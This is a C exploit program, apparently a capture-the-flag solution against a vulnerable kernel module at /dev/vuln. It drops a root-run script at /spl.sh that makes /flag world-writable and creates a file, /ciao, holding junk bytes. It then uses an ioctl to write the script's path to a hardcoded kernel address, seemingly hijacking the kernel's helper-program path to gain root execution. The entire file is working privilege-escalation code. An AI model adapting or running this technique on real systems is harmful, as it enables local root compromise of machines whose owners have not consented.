#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>


void create_sploit(){
    int file = open("/spl.sh", O_CREAT | O_WRONLY);
    char *sploit = "#!/bin/sh\n"
                   "chmod 777 /flag";
    write(file, sploit, strlen(sploit));
    close(file);
    system("chmod 777 /spl.sh");

    file = open("/ciao", O_CREAT | O_WRONLY);
    write(file, "\xff\xff\xff\xff", 4);
    close(file);
    system("chmod 777 /ciao");
    return;
}

__attribute__((packed)) struct payload {
    unsigned long long addr;
    char val[8];
} payload;

int main() {
    create_sploit();

    int challenge = open("/dev/vuln",O_RDWR);
    if(challenge==-1){
        printf("error opening the challenge module. Errno: %d\n",errno);
    }

    

    char * er_programmuz = "/spl.sh";
    payload.addr = 0xffffffff82444620;
    //0xffffffff82444620

    strcpy(payload.val, er_programmuz);
    printf("Payload addr: %llx\n", &payload);
    printf("Payload val: %s\n", payload.val);
    printf("Payload inside addr: %llx\n", payload.addr);

    int result = ioctl(challenge, 0x53a, &payload);
    if(result == -1){
        printf("error in ioctl. Errno: %d\n",errno);
    }

    // system("/bin/sh");
    return 0;
}